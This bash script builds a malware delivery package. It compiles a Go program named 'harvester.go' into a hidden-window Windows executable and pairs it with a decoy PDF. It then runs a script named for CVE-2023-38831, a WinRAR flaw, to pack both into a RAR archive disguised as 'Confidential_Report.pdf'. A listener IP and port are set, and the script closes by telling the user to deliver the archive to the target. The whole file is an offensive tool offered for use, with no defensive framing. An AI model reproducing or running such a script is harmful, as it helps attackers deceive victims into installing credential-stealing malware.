#!/bin/bash

set -e

LISTENER_IP="192.168.1.100"   # CHANGE THIS
LISTENER_PORT="4444"
GO_PAYLOAD="harvester.go"
PDF_COVER="cover.pdf"
EXE_OUTPUT="payload.exe"
RAR_OUTPUT="Confidential_Report.pdf.rar"

echo "[*] Building Windows executable..."
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o "$EXE_OUTPUT" "$GO_PAYLOAD"

echo "[*] Creating convincing PDF cover..."
python3 make_pdf.py

echo "[*] Generating malicious RAR archive..."
python3 cve_2023_38831.py "$PDF_COVER" "$EXE_OUTPUT" "$RAR_OUTPUT"

# Optional: clean up intermediate files
rm -f "$EXE_OUTPUT" "$PDF_COVER"

echo "[+] Done! Deliver $RAR_OUTPUT to the target."